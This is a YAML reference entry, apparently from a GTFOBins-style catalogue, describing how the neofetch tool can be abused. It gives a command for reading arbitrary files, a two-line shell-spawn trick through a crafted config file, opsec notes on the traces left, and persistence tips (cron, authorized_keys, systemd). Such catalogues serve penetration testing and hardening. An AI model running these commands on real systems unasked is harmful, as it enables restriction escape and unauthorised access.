---
name: neofetch
capabilities:
- exec
- spawn
- read
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: neofetch --ascii /path/to/input-file
  notes: The file content is used as the logo while some other information is displayed on its right.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo 'exec /bin/sh' >/path/to/temp-file
    neofetch --config /path/to/temp-file
references:
- https://gtfobins.github.io/gtfobins/neofetch/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
